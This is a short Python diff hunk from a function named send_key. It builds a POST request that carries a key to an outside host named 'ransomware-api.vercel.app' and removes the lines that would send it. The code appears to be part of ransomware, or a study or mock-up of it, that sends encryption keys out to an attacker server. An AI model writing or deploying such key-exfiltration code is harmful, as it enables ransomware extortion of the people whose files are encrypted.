@@ -49,10 +49,5 @@ def send_key(key):
     req = urllib.request.Request('https://ransomware-api.vercel.app/encryption', data=data_json, method='POST')
     req.add_header('Content-Type', 'application/json')
 
-    with urllib.request.urlopen(req, timeout=60) as response:
-        response_data = response.read()
-    
-        print(response_data.decode('utf-8'))
-
 
 
